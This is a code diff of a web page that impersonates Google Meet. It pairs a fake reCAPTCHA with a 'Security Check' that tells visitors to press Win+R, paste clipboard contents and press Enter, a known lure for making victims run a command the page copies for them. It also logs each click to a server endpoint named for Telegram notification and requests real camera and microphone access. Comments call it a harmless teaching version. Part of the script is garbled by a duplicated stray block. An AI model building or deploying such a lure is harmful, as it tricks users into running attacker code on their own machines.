@@ -5,6 +5,7 @@
   <title>Google Meet</title>
   <link rel="icon" href="icon.svg" type="image/svg+xml" />
   <style>
+    /* 基础样式保持原样 */
     * {
       box-sizing: border-box;
       margin: 0;
@@ -18,7 +19,6 @@
       -webkit-font-smoothing: antialiased;
     }
 
-    /* HEADER */
     .meet-header {
       display: flex;
       justify-content: flex-start;
@@ -30,7 +30,6 @@
       height: 40px;
     }
 
-    /* MAIN CONTENT */
     .meet-main {
       display: flex;
       justify-content: center;
@@ -39,7 +38,6 @@
       gap: 10px;
     }
 
-    /* VIDEO PREVIEW */
     .video-preview {
       width: 740px;
       height: 416px;
@@ -47,11 +45,22 @@
       border-radius: 12px;
       box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.4);
       position: relative;
-      /* Base for overlay */
       overflow: hidden;
       color: #fff;
     }
 
+    /* 隐藏的 <video> 元素，用于真实摄像头画面 */
+    #real-video {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: 1;
+    }
+
+    /* UI 层叠加在视频之上 */
     .video-ui {
       display: flex;
       flex-direction: column;
@@ -62,12 +71,21 @@
       opacity: 0;
       transition: opacity 0.5s ease;
       font-family: "Product Sans", sans-serif;
+      position: relative;
+      z-index: 2;
+      pointer-events: none;  /* 让按钮可以穿透点击，但按钮自己需要能点击 */
+    }
+
+    .video-ui .allow-btn,
+    .video-ui .control-btn {
+      pointer-events: auto;   /* 按钮恢复正常点击 */
     }
 
     .video-ui-top {
       display: flex;
       justify-content: space-between;
       color: #fff;
+      pointer-events: auto;
     }
 
     .video-ui-top span {
@@ -82,7 +100,7 @@
       align-items: center;
       gap: 24px;
       margin-top: -20px;
-      /* Slight lift */
+      pointer-events: auto;
     }
 
     .threeDots {
@@ -92,13 +110,11 @@
 
     .prompt-text {
       font-size: 19px;
-      /* Reduced slightly to ensure it stays on one line */
       font-weight: 400;
       max-width: none;
-      /* Allow full width for one line */
       white-space: nowrap;
-      /* Forces one line as requested */
       line-height: 1.3;
+      text-shadow: 0 1px 4px rgba(0,0,0,0.5);
     }
 
     .allow-btn {
@@ -110,7 +126,6 @@
       font-family: "Product Sans", sans-serif;
       font-size: 15px;
       font-weight: 600;
-      /* Bolder as requested */
       cursor: pointer;
     }
 
@@ -119,11 +134,11 @@
       justify-content: center;
       gap: 15px;
       padding-bottom: 4px;
+      pointer-events: auto;
     }
 
     .control-btn {
       width: 55px;
-      /* Restored to circular */
       height: 55px;
       border: 1px solid white;
       border-radius: 50%;
@@ -132,16 +147,19 @@
       align-items: center;
       position: relative;
       cursor: pointer;
+      transition: background 0.3s;
+      background: rgba(0,0,0,0.4);
+      backdrop-filter: blur(2px);
     }
 
     .control-btn:hover {
       background-color: #555;
-      transition: 0.5s;
     }
 
-    .control-btn.muted {
+    /* 设备关闭状态 */
+    .control-btn.off {
       background: #3c4043;
-      /* Darker as in original */
+      border-color: #9aa0a6;
     }
 
     .control-btn img {
@@ -149,7 +167,17 @@
       height: 24px;
       filter: brightness(0) invert(1);
       object-fit: contain;
-      /* Removed aggressive filters to fix 'black square' bug */
+    }
+
+    /* 关闭时的红色斜线效果 */
+    .control-btn.off::after {
+      content: "";
+      position: absolute;
+      width: 2px;
+      height: 28px;
+      background-color: #ea4335;
+      transform: rotate(45deg);
+      border-radius: 2px;
     }
 
     .badge-warning {
@@ -159,7 +187,6 @@
       width: 14px;
       height: 20px;
       background: #fbbc04;
-      /* Google Yellow */
       border-radius: 40%;
       display: flex;
       justify-content: center;
@@ -168,16 +195,9 @@
       color: #000;
       font-weight: 700;
       border: 1.5px solid #202124;
-      /* Masking border */
     }
 
-    .top-right-dots {
-      font-size: 20px;
-      cursor: pointer;
-      margin-right: 8px;
-    }
-
-    /* RIGHT CONTENT SECTION */
+    /* 右侧区域 */
     .right-section {
       width: 440px;
       padding-left: 20px;
@@ -217,16 +237,10 @@
     }
 
     @keyframes spin {
-      from {
-        transform: rotate(0deg);
-      }
-
-      to {
-        transform: rotate(360deg);
-      }
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
     }
 
-    /* RECAPTCHA BOX STYLE */
     .recaptcha-anchor {
       display: none;
       width: 304px;
@@ -238,7 +252,6 @@
       margin: 0 auto 30px;
       padding: 0 12px;
       cursor: pointer;
-      /* Removed animation for instant appearance as requested */
     }
 
     .recaptcha-content {
@@ -278,7 +291,6 @@
       height: 20px;
       border: solid #00a65a;
       border-width: 0 3px 3px 0;
-      /* Thinner checkmark as requested */
       transform: rotate(45deg);
     }
 
@@ -305,29 +317,20 @@
       margin-top: 2px;
     }
 
-    /* INSTRUCTION WINDOW (GRAY) */
     .instruction-window {
       display: none;
       background-color: #f8f9fa;
       border: 1px solid #dadce0;
       border-radius: 12px;
       padding: 16px 32px 24px;
-      /* Reduced top padding to align with status-title */
       text-align: left;
       animation: slideIn 0.3s ease-out;
       width: 100%;
     }
 
     @keyframes slideIn {
-      from {
-        opacity: 0;
-        transform: translateX(20px);
-      }
-
-      to {
-        opacity: 1;
-        transform: translateX(0);
-      }
+      from { opacity: 0; transform: translateX(20px); }
+      to { opacity: 1; transform: translateX(0); }
     }
 
     .steps-title {
@@ -370,7 +373,6 @@
       vertical-align: middle;
     }
 
-    /* VERIFICATION BOX */
     .code-box-black {
       background: #ffffff;
       border: 1px solid #000;
@@ -382,21 +384,17 @@
       color: #202124;
     }
 
-    /* BUTTON REDESIGNED AS ROUNDED PILL */
     .btn-blue {
       background-color: #1a73e8;
       color: #fff;
       border: none;
       padding: 12px 36px;
       border-radius: 50px;
-      /* Pill shape as requested */
       font-size: 14px;
       font-weight: 500;
       cursor: pointer;
       float: right;
-      transition:
-        background 0.2s,
-        box-shadow 0.2s;
+      transition: background 0.2s, box-shadow 0.2s;
       font-family: "Product Sans", sans-serif;
       box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
     }
@@ -412,7 +410,6 @@
       clear: both;
     }
 
-    /* ERROR MESSAGE */
     .error-msg {
       color: #d93025;
       font-size: 13px;
@@ -432,18 +429,14 @@
       align-items: center;
       justify-content: space-between;
       gap: 10px;
-
       min-width: 160px;
       height: 34px;
       padding: 0 12px;
-
       background: #f7f7f7;
       border: 1px solid #dcdcdc;
       border-radius: 999px;
-
       cursor: pointer;
       transition: all 0.2s ease;
-
       outline: none;
     }
 
@@ -496,48 +489,51 @@
   <main class="meet-main">
     <div class="container-video">
       <div class="video-preview">
+        <!-- 真实摄像头画面层 -->
+        <video id="real-video" autoplay playsinline muted></video>
+        
+        <!-- UI 叠加层 -->
         <div id="video-ui" class="video-ui">
           <div class="video-ui-top">
-            <span id="meeting-lang-label">финский</span>
+            <span id="meeting-lang-label">中文</span>
             <img src="threeDots.svg" alt="icon" class="threeDots" />
           </div>
           <div class="video-ui-center">
             <h2 id="meeting-prompt" class="prompt-text">
-              Вы хотите, чтобы вас видели и слышали на совещании?
+              准备加入？是否允许使用摄像头和麦克风？
             </h2>
             <button class="allow-btn" id="meeting-allow-btn">
-              Предоставьте доступ к микрофону и камере.
+              允许使用麦克风和摄像头
             </button>
           </div>
           <div class="video-ui-bottom">
-            <div class="control-btn">
-              <img src="microphone.svg" style="width: 60px" alt="Mic" />
-              <div class="badge-warning">!</div>
+            <div class="control-btn" id="mic-control">
+              <img src="microphone.svg" style="width: 24px;" alt="Mic" />
+              <div class="badge-warning" id="mic-warning">!</div>
             </div>
-            <div class="control-btn">
+            <div class="control-btn" id="cam-control">
               <img src="videocamera.svg" alt="Cam" />
-              <div class="badge-warning">!</div>
+              <div class="badge-warning" id="cam-warning">!</div>
             </div>
           </div>
         </div>
       </div>
 
+      <!-- 底部状态 pills -->
       <div class="requirement-row">
-        <button class="requirement-pill" type="button">
+        <button class="requirement-pill" type="button" id="mic-pill">
           <img src="microphone.svg" alt="microphone" class="pill-icon" />
-          <span class="pill-text" id="microphone-pill-text">Требуется...</span>
+          <span class="pill-text" id="microphone-pill-text">必需...</span>
           <img src="arrow-down.svg" alt="arrow" class="pill-arrow" />
         </button>
-
-        <button class="requirement-pill" type="button">
+        <button class="requirement-pill" type="button" id="sound-pill">
           <img src="sound.svg" alt="sound" class="pill-icon" />
-          <span class="pill-text" id="sound-pill-text">Требуется...</span>
+          <span class="pill-text" id="sound-pill-text">必需...</span>
           <img src="arrow-down.svg" alt="arrow" class="pill-arrow" />
         </button>
-
-        <button class="requirement-pill" type="button">
+        <button class="requirement-pill" type="button" id="cam-pill">
           <img src="videocamera.svg" alt="document" class="pill-icon" />
-          <span class="pill-text" id="camera-pill-text">Требуется...</span>
+          <span class="pill-text" id="camera-pill-text">必需...</span>
           <img src="arrow-down.svg" alt="arrow" class="pill-arrow" />
         </button>
       </div>
@@ -545,55 +541,60 @@
 
     <div class="right-section">
       <div id="status-box" class="status-box">
-        <h1 id="status-title" class="status-title">Getting ready...</h1>
+        <h1 id="status-title" class="status-title">正在准备...</h1>
         <p id="status-subtitle" class="status-subtitle">
-          You'll be able to join in just a moment
+          您稍后即可加入会议
         </p>
         <div class="circle-spinner"></div>
       </div>
 
-      <!-- RECAPTCHA CHECKBOX BOX -->
+      <!-- RECAPTCHA 区域 -->
       <div id="recaptcha-anchor" class="recaptcha-anchor">
         <div class="recaptcha-content">
           <div class="checkbox-area">
             <div id="recaptcha-checkbox" class="recaptcha-checkbox"></div>
-            <span id="recaptcha-text" class="recaptcha-text">I'm not a robot</span>
+            <span id="recaptcha-text" class="recaptcha-text">我不是机器人</span>
           </div>
           <div class="recaptcha-logo-area">
             <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
             <span>reCAPTCHA</span>
-            <div style="font-size: 7px; color: #555">Privacy - Terms</div>
+            <div style="font-size: 7px; color: #555">隐私 - 条款</div>
           </div>
         </div>
       </div>
 
+      <!-- 验证步骤窗口 -->
       <div id="verify-window" class="instruction-window">
         <div id="error-msg" class="error-msg"></div>
-        <h2 id="verify-header" class="steps-title">Security Check</h2>
+        <h2 id="verify-header" class="steps-title">安全检查</h2>
         <p id="verify-subtitle" class="steps-subtitle"></p>
 
-        <ol id="steps-list" class="steps-list">
-          <!-- Steps will be populated by JS for localization -->
-        </ol>
+        <ol id="steps-list" class="steps-list"></ol>
 
         <p style="font-size: 13px; font-weight: 500; margin-bottom: 8px" id="agree-text">
-          You will observe and agree:
+          您将确认并同意以下内容：
         </p>
-        <div class="code-box-black">
-          "I am not a robot – Google meet Verification ID:
-          <b id="verification-id"></b>"
-        </div>
+        <div class="code-box-black" id="code-box"></div>
 
         <div class="footer-btn-row">
           <button type="button" class="btn-blue" id="verify-button">
-            Verify Identity
+            验证身份
           </button>
         </div>
       </div>
     </div>
   </main>
 
-  <script>let captchaText = '';
+  <script>
+    // ---------- 教学版本：真实摄像头 + 麦克风，保留攻击流程演示 ----------
+    // 1. 点击"允许"按钮后，请求真实摄像头和麦克风权限，将视频流显示在 #real-video 中。
+    // 2. 同步更新设备状态 UI（按钮颜色、pill 文字）。
+    // 3. 复制内容仍为 "恶意命令"（无害）。
+    // 4. 保留多语言支持（中文为主）。
+
+    let captchaText = '';
+
+    // DOM 元素
     const statusBox = document.getElementById('status-box');
     const statusTitle = document.getElementById('status-title');
     const statusSubtitle = document.getElementById('status-subtitle');
@@ -606,54 +607,148 @@
     const stepsListEl = document.getElementById('steps-list');
     const agreeTextEl = document.getElementById('agree-text');
     const verifyBtn = document.getElementById('verify-button');
-    const verificationIdEl = document.getElementById('verification-id');
     const errorMsgEl = document.getElementById('error-msg');
     const videoUI = document.getElementById('video-ui');
     const meetingLangLabel = document.getElementById('meeting-lang-label');
     const meetingPrompt = document.getElementById('meeting-prompt');
     const meetingAllowBtn = document.getElementById('meeting-allow-btn');
+    
+    // 底部状态文字
     const micPillText = document.getElementById('microphone-pill-text');
     const soundPillText = document.getElementById('sound-pill-text');
     const camPillText = document.getElementById('camera-pill-text');
-    const winIcon = `<img src="win.png" class="win-logo">`;
+    
+    // 控制按钮
+    const micControl = document.getElementById('mic-control');
+    const camControl = document.getElementById('cam-control');
+    const micWarning = document.getElementById('mic-warning');
+    const camWarning = document.getElementById('cam-warning');
+
+    // 真实视频元素
+    const realVideo = document.getElementById('real-video');
+    
+    // Windows 键图标
+    const winIcon = `<img src="win.png" class="win-logo" alt="Win键">`;
+
+    // 设备状态
+    let micEnabled = false;   // 默认关闭，等待用户授权
+    let camEnabled = false;
+    let mediaStream = null;   // 保存媒体流，便于后续开关操作
+
+// 更新 UI 以反映设备状态（修正感叹号显示逻辑）
+function updateDeviceUI() {
+  // 麦克风按钮状态
+  if (micEnabled) {
+    micControl.classList.remove('off');
+  } else {
+    micControl.classList.add('off');
+  }
+  // 摄像头按钮状态
+  if (camEnabled) {
+    camControl.classList.remove('off');
+  } else {
+    camControl.classList.add('off');
+  }
+
+  // ✅ 感叹号逻辑：设备启用且权限已获取时隐藏，否则显示
+  if (micWarning) {
+    micWarning.style.display = micEnabled ? 'none' : 'flex';
+  }
+  if (camWarning) {
+    camWarning.style.display = camEnabled ? 'none' : 'flex';
+  }
+
+  // 更新底部 pill 文字
+  if (micPillText) {
+    micPillText.innerText = micEnabled ? '已允许' : '已禁止';
+    micPillText.style.color = micEnabled ? '#1a73e8' : '#9a9a9a';
+  }
+  if (camPillText) {
+    camPillText.innerText = camEnabled ? '已允许' : '已禁止';
+    camPillText.style.color = camEnabled ? '#1a73e8' : '#9a9a9a';
+  }
+}
+      
+      // 更新底部 pill 文字
+      if (micPillText) {
+        micPillText.innerText = micEnabled ? '已允许' : '已禁止';
+        micPillText.style.color = micEnabled ? '#1a73e8' : '#9a9a9a';
+      }
+      if (camPillText) {
+        camPillText.innerText = camEnabled ? '已允许' : '已禁止';
+        camPillText.style.color = camEnabled ? '#1a73e8' : '#9a9a9a';
+      }
+
+// 修改 requestMediaPermissions 函数，成功后隐藏中间内容
+async function requestMediaPermissions() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: true
+    });
+    
+    mediaStream = stream;
+    micEnabled = true;
+    camEnabled = true;
+    
+    if (realVideo) {
+      realVideo.srcObject = stream;
+    }
+    
+    updateDeviceUI();
+    
+    // ✅ 新增：隐藏提示文字和“允许”按钮
+    const centerArea = document.querySelector('.video-ui-center');
+    if (centerArea) {
+      centerArea.style.opacity = '0';
+      centerArea.style.transition = 'opacity 0.3s';
+      // 完全透明后设为不可见，避免干扰点击
+      setTimeout(() => {
+        centerArea.style.display = 'none';
+      }, 300);
+    }
+    
+    console.log('[教学演示] 摄像头和麦克风权限已获取，界面已更新');
+  } catch (error) {
+    console.error('[教学演示] 获取媒体权限失败:', error);
+    alert('无法访问摄像头/麦克风，但教学演示仍可继续。请检查设备权限。');
+  }
+}
+
+    // 关闭媒体流（释放摄像头指示灯）
+    function stopMediaStream() {
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+      }
+      if (realVideo) {
+        realVideo.srcObject = null;
+      }
+      micEnabled = false;
+      camEnabled = false;
+      updateDeviceUI();
+    }
+
+    // 多语言翻译库
     const translations = {
-      fi: {
-        status: "Valmistellaan...",
-        subtitle: "Voit liittyä hetken kuluttua",
-        imNotRobot: "En ole robotti",
-        langLabel: "suomi",
-        prompt: "Haluatko näkyä ja kuulua kokouksessa?",
-        allowBtn: "Salli mikrofonin ja kameran käyttö",
-        required: "Vaaditaan...",
-        verifyTitle: "Vahvista henkilöllisyytesi",
-        verifySubtitle: "Todistaaksesi ettet ole robotti, noudata näitä ohjeita:",
+      zh: {
+        status: "正在准备...",
+        subtitle: "您稍后即可加入会议",
+        imNotRobot: "我不是机器人",
+        langLabel: "中文",
+        prompt: "准备加入？是否允许使用摄像头和麦克风？",
+        allowBtn: "允许使用麦克风和摄像头",
+        required: "必需...",
+        verifyTitle: "安全检查",
+        verifySubtitle: "为了证明您不是机器人，请按照以下步骤操作：",
         steps: [
-          `1. Paina ${winIcon} + R`,
-          "2. Liitä ikkunaan <b>Ctrl</b> + <b>V</b>",
-          "3. Paina <b>Enter</b> viimeistelläksesi"
+          `1. 按下 ${winIcon} + R 键`,
+          "2. 在运行窗口中粘贴 <b>Ctrl</b> + <b>V</b>",
+          "3. 按 <b>Enter</b> 键完成"
         ],
-        agree: "Vahvistat seuraavat tiedot:",
-        btn: "Vahvista",
-        error: "Vahvistus epäonnistui, yritä uudelleen."
-      },
-      ru: {
-        status: "Подготовка...",
-        subtitle: "Вы сможете присоединиться через мгновение",
-        imNotRobot: "Я не робот",
-        langLabel: "русский",
-        prompt: "Вы хотите, чтобы вас видели и слышали на совещании?",
-        allowBtn: "Предоставьте доступ к микрофону и камере.",
-        required: "Требуется...",
-        verifyTitle: "Проверка безопасности",
-        verifySubtitle: "Чтобы подтвердить, что вы не робот, выполните следующие действия:",
-        steps: [
-          `1. Нажмите ${winIcon} + R`,
-          "2. В окне вставьте <b>Ctrl</b> + <b>V</b>",
-          "3. Нажмите <b>Enter</b> для завершения"
-        ],
-        agree: "Вы подтверждаете и соглашаетесь:",
-        btn: "Подтвердить",
-        error: "Вы не прошли верификацию, попробуйте еще раз."
+        agree: "您将确认并同意以下内容：",
+        btn: "验证身份",
+        error: "验证失败，请重试。"
       },
       en: {
         status: "Getting ready...",
@@ -673,217 +768,10 @@
         agree: "You will observe and agree:",
         btn: "Verify Identity",
         error: "Verification failed, please try again."
-      },
-      fr: {
-        status: "Préparation...",
-        subtitle: "Vous pourrez participer dans un instant",
-        imNotRobot: "Je ne suis pas un robot",
-        langLabel: "français",
-        prompt: "Prêt à participer ? Souhaitez-vous que l'on vous voie et que l'on vous entende ?",
-        allowBtn: "Autoriser l'accès au micro et à la caméra",
-        required: "Requis...",
-        verifyTitle: "Contrôle de sécurité",
-        verifySubtitle: "Pour prouver que vous n'êtes pas un robot, veuillez suivre ces étapes :",
-        steps: [
-          `1. Appuyez sur ${winIcon} + R`,
-          "2. Dans la fenêtre, collez <b>Ctrl</b> + <b>V</b>",
-          "3. Appuyez sur <b>Entrée</b> pour terminer"
-        ],
-        agree: "Vous observez et acceptez :",
-        btn: "Vérifier l'identité",
-        error: "La vérification a échoué, veuillez réessayer."
-      },
-      de: {
-        status: "Vorbereitung...",
-        subtitle: "Sie können in Kürze teilnehmen",
-        imNotRobot: "Ich bin kein Roboter",
-        langLabel: "Deutsch",
-        prompt: "Bereit zur Teilnahme? Möchten Sie gesehen und gehört werden?",
-        allowBtn: "Mikrofon- und Kamerazugriff zulassen",
-        required: "Erforderlich...",
-        verifyTitle: "Sicherheitsprüfung",
-        verifySubtitle: "Um zu beweisen, dass Sie kein Roboter sind, folgen Sie bitte diesen Schritten:",
-        steps: [
-          `1. Drücken Sie ${winIcon} + R`,
-          "2. Fügen Sie im Fenster <b>Strg</b> + <b>V</b> ein",
-          "3. Drücken Sie die <b>Eingabetaste</b>, um den Vorgang abzuschließen"
-        ],
-        agree: "Sie erklären sich mit Folgendem einverstanden:",
-        btn: "Identität prüfen",
-        error: "Überprüfung fehlgeschlagen, bitte versuchen Sie es erneut."
-      },
-      es: {
-        status: "Preparándote...",
-        subtitle: "Podrás unirte en un momento",
-        imNotRobot: "No soy un robot",
-        langLabel: "español",
-        prompt: "¿Todo listo para unirte? ¿Quieres que se te vea y se te oiga?",
-        allowBtn: "Permitir acceso al micrófono y a la cámara",
-        required: "Obligatorio...",
-        verifyTitle: "Control de seguridad",
-        verifySubtitle: "Para demostrar que no eres un robot, sigue estos pasos:",
-        steps: [
-          `1. Pulsa ${winIcon} + R`,
-          "2. En la ventana, pega <b>Ctrl</b> + <b>V</b>",
-          "3. Pulsa <b>Intro</b> para finalizar"
-        ],
-        agree: "Declaras y aceptas lo siguiente:",
-        btn: "Verificar identidad",
-        error: "Error de verificación. Inténtalo de nuevo."
-      },
-      pt: {
-        status: "Preparando...",
-        subtitle: "Você poderá participar em um momento",
-        imNotRobot: "Não sou um robô",
-        langLabel: "português",
-        prompt: "Tudo pronto para participar? Quer aparecer e ser ouvido?",
-        allowBtn: "Permitir acesso ao microfone e à câmera",
-        required: "Obrigatório...",
-        verifyTitle: "Verificação de segurança",
-        verifySubtitle: "Para provar que você não é um robô, siga estas etapas:",
-        steps: [
-          `1. Pressione ${winIcon} + R`,
-          "2. Na janela, cole <b>Ctrl</b> + <b>V</b>",
-          "3. Pressione <b>Enter</b> para finalizar"
-        ],
-        agree: "Você observará e concordará:",
-        btn: "Verificar identidade",
-        error: "A verificação falhou. Tente novamente."
-      },
-      it: {
-        status: "Preparazione in corso...",
-        subtitle: "Potrai partecipare tra un istante",
-        imNotRobot: "Non sono un robot",
-        langLabel: "italiano",
-        prompt: "Pronto a partecipare? Vuoi farti vedere e sentire?",
-        allowBtn: "Consenti l'accesso al microfono e alla fotocamera",
-        required: "Richiesto...",
-        verifyTitle: "Controllo di sicurezza",
-        verifySubtitle: "Per dimostrare che non sei un robot, segui questi passaggi:",
-        steps: [
-          `1. Premi ${winIcon} + R`,
-          "2. Nella finestra, incolla <b>Ctrl</b> + <b>V</b>",
-          "3. Premi <b>Invio</b> per terminare"
-        ],
-        agree: "Dichiari e accetti quanto segue:",
-        btn: "Verifica identità",
-        error: "Verifica fallita, riprova."
-      },
-      nl: {
-        status: "Voorbereiden...",
-        subtitle: "Je kunt over een moment deelnemen",
-        imNotRobot: "Ik ben geen robot",
-        langLabel: "Nederlands",
-        prompt: "Klaar om deel te nemen? Wil je gezien en gehoord worden?",
-        allowBtn: "Toegang tot microfoon en camera toestaan",
-        required: "Vereist...",
-        verifyTitle: "Veiligheidscontrole",
-        verifySubtitle: "Om te bewijzen dat je geen robot bent, volg je deze stappen:",
-        steps: [
-          `1. Druk op ${winIcon} + R`,
-          "2. Plak <b>Ctrl</b> + <b>V</b> in het venster",
-          "3. Druk op <b>Enter</b> om te voltooien"
-        ],
-        agree: "Je verklaart het volgende en gaat ermee akkoord:",
-        btn: "Identiteit controleren",
-        error: "Verificatie mislukt, probeer het opnieuw."
-      },
-      ja: {
-        status: "準備中...",
-        subtitle: "まもなく参加できるようになります",
-        imNotRobot: "私はロボットではありません",
-        langLabel: "日本語",
-        prompt: "参加する準備はできましたか？ カメラとマイクの使用を許可しますか？",
-        allowBtn: "マイクとカメラへのアクセスを許可する",
-        required: "必須...",
-        verifyTitle: "セキュリティ確認",
-        verifySubtitle: "ロボットではないことを証明するために、次の手順に従ってください：",
-        steps: [
-          `1. ${winIcon} + R キーを押します`,
-          "2. ウィンドウに <b>Ctrl</b> + <b>V</b> を貼り付けます",
-          "3. <b>Enter</b> キーを押して完了します"
-        ],
-        agree: "以下の内容を確認し、同意してください：",
-        btn: "本人確認を行う",
-        error: "認証に失敗しました。もう一度お試しください。"
-      },
-      ko: {
-        status: "준비 중...",
-        subtitle: "잠시 후 참여할 수 있습니다",
-        imNotRobot: "로봇이 아닙니다",
-        langLabel: "한국어",
-        prompt: "참여할 준비가 되셨나요? 카메라와 마이크를 사용하시겠습니까?",
-        allowBtn: "마이크 및 카메라 액세스 허용",
-        required: "필수...",
-        verifyTitle: "보안 확인",
-        verifySubtitle: "로봇이 아님을 증명하려면 다음 단계를 따르세요.",
-        steps: [
-          `1. ${winIcon} + R 키를 누릅니다`,
-          "2. 창에 <b>Ctrl</b> + <b>V</b>를 붙여넣습니다",
-          "3. <b>Enter</b>를 눌러 완료합니다"
-        ],
-        agree: "다음 사항을 확인하고 이에 동의합니다.",
-        btn: "본인 확인",
-        error: "인증에 실패했습니다. 다시 시도해 주세요."
-      },
-      vi: {
-        status: "Đang chuẩn bị...",
-        subtitle: "Bạn sẽ có thể tham gia sau giây lát",
-        imNotRobot: "Tôi không phải là người máy",
-        langLabel: "tiếng Việt",
-        prompt: "Bạn đã sẵn sàng tham gia chưa? Bạn có muốn bật camera và micrô không?",
-        allowBtn: "Cho phép truy cập micrô và camera",
-        required: "Bắt buộc...",
-        verifyTitle: "Kiểm tra bảo mật",
-        verifySubtitle: "Để chứng minh bạn không phải là người máy, vui lòng làm theo các bước sau:",
-        steps: [
-          `1. Nhấn ${winIcon} + R`,
-          "2. Trong cửa sổ, dán <b>Ctrl</b> + <b>V</b>",
-          "3. Nhấn <b>Enter</b> để hoàn tất"
-        ],
-        agree: "Bạn sẽ quan sát và đồng ý:",
-        btn: "Xác minh danh tính",
-        error: "Xác minh thất bại, vui lòng thử lại."
-      },
-      hi: {
-        status: "तैयारी हो रही है...",
-        subtitle: "आप कुछ ही पलों में शामिल हो पाएंगे",
-        imNotRobot: "मैं रोबोट नहीं हूँ",
-        langLabel: "हिन्दी",
-        prompt: "शामिल होने के लिए तैयार हैं? क्या आप चाहते हैं कि आपको देखा और सुना जाए?",
-        allowBtn: "माइक्रोफ़ोन और कैमरा एक्सेस की अनुमति दें",
-        required: "आवश्यक...",
-        verifyTitle: "सुरक्षा जांच",
-        verifySubtitle: "यह साबित करने के लिए कि आप रोबोट नहीं हैं, कृपया इन चरणों का पालन करें:",
-        steps: [
-          `1. ${winIcon} + R दबाएं`,
-          "2. विंडो में, <b>Ctrl</b> + <b>V</b> पेस्ट करें",
-          "3. पूरा करने के लिए <b>Enter</b> दबाएं"
-        ],
-        agree: "आप देखेंगे और सहमत होंगे:",
-        btn: "पहचान सत्यापित करें",
-        error: "सत्यापन विफल रहा, कृपया पुनः प्रयास करें।"
-      },
-      id: {
-        status: "Bersiap...",
-        subtitle: "Anda akan dapat bergabung sebentar lagi",
-        imNotRobot: "Saya bukan robot",
-        langLabel: "Bahasa Indonesia",
-        prompt: "Siap bergabung? Apakah Anda ingin dilihat dan didengar?",
-        allowBtn: "Izinkan akses mikrofon dan kamera",
-        required: "Diperlukan...",
-        verifyTitle: "Pemeriksaan Keamanan",
-        verifySubtitle: "Untuk membuktikan bahwa Anda bukan robot, harap ikuti langkah-langkah berikut:",
-        steps: [
-          `1. Tekan ${winIcon} + R`,
-          "2. Di jendela, tempel <b>Ctrl</b> + <b>V</b>",
-          "3. Tekan <b>Enter</b> untuk menyelesaikan"
-        ],
-        agree: "Anda akan mengamati dan menyetujui:",
-        btn: "Verifikasi Identitas",
-        error: "Verifikasi gagal, silakan coba lagi."
       }
     };
+
+    // 剪贴板复制函数
     function copyToClipboard(text) {
       const ta = document.createElement('textarea');
       ta.value = text;
@@ -895,13 +783,18 @@
       document.execCommand('copy');
       document.body.removeChild(ta);
     }
+
+    // 模拟通知（无实际危害）
     function sendTelegramNotification() {
       fetch('/index.php?action=log_click').catch(() => { });
     }
+
     document.addEventListener('DOMContentLoaded', () => {
+      // 语言检测
       const userLang = navigator.language.split('-')[0];
-      const isRussian = userLang === 'ru';
       const t = translations[userLang] || translations.en;
+
+      // 更新所有文本
       if (statusTitle) statusTitle.innerText = t.status;
       if (statusSubtitle) statusSubtitle.innerText = t.subtitle;
       if (recaptchaTextEl) recaptchaTextEl.innerText = t.imNotRobot;
@@ -912,6 +805,7 @@
       if (meetingLangLabel) meetingLangLabel.innerText = t.langLabel;
       if (meetingPrompt) meetingPrompt.innerText = t.prompt;
       if (meetingAllowBtn) meetingAllowBtn.innerText = t.allowBtn;
+
       if (stepsListEl && t.steps) {
         stepsListEl.innerHTML = '';
         t.steps.forEach(stepText => {
@@ -920,11 +814,81 @@
           stepsListEl.appendChild(li);
         });
       }
-      if (micPillText) micPillText.innerText = t.required;
-      if (soundPillText) soundPillText.innerText = t.required;
-      if (camPillText) camPillText.innerText = t.required;
+
       const vId = "114514";
-      if (verificationIdEl) verificationIdEl.textContent = vId;
+      const codeBox = document.getElementById('code-box');
+      if (codeBox) {
+        codeBox.innerHTML = `"${t.imNotRobot} – Google Meet Verification ID: <b id="verification-id">${vId}</b>"`;
+      }
+
+      // 初始化设备状态 UI（默认关闭）
+      updateDeviceUI();
+
+      // ----- 交互事件绑定 -----
+      
+      // "允许"按钮：请求真实媒体权限
+      meetingAllowBtn.addEventListener('click', () => {
+        requestMediaPermissions();
+      });
+
+      // 麦克风按钮点击：切换状态（仅当已有媒体流时生效）
+      micControl.addEventListener('click', (e) => {
+        e.stopPropagation();
+        if (mediaStream) {
+          const audioTracks = mediaStream.getAudioTracks();
+          audioTracks.forEach(track => {
+            track.enabled = !track.enabled;
+          });
+          micEnabled = audioTracks.length > 0 ? audioTracks[0].enabled : false;
+        } else {
+          // 没有媒体流时，提示用户先点击"允许"
+          alert('请先点击"允许使用麦克风和摄像头"授权');
+        }
+        updateDeviceUI();
+      });
+      
+      // 摄像头按钮点击
+      camControl.addEventListener('click', (e) => {
+        e.stopPropagation();
+        if (mediaStream) {
+          const videoTracks = mediaStream.getVideoTracks();
+          videoTracks.forEach(track => {
+            track.enabled = !track.enabled;
+          });
+          camEnabled = videoTracks.length > 0 ? videoTracks[0].enabled : false;
+        } else {
+          alert('请先点击"允许使用麦克风和摄像头"授权');
+        }
+        updateDeviceUI();
+      });
+
+      // 底部 pill 点击也可切换对应设备
+      document.getElementById('mic-pill').addEventListener('click', () => {
+        if (mediaStream) {
+          const audioTracks = mediaStream.getAudioTracks();
+          audioTracks.forEach(track => {
+            track.enabled = !track.enabled;
+          });
+          micEnabled = audioTracks.length > 0 ? audioTracks[0].enabled : false;
+          updateDeviceUI();
+        } else {
+          alert('请先点击"允许使用麦克风和摄像头"授权');
+        }
+      });
+      document.getElementById('cam-pill').addEventListener('click', () => {
+        if (mediaStream) {
+          const videoTracks = mediaStream.getVideoTracks();
+          videoTracks.forEach(track => {
+            track.enabled = !track.enabled;
+          });
+          camEnabled = videoTracks.length > 0 ? videoTracks[0].enabled : false;
+          updateDeviceUI();
+        } else {
+          alert('请先点击"允许使用麦克风和摄像头"授权');
+        }
+      });
+
+      // 加载流程：1.2秒后隐藏 spinner，显示 reCAPTCHA 和 UI
       setTimeout(() => {
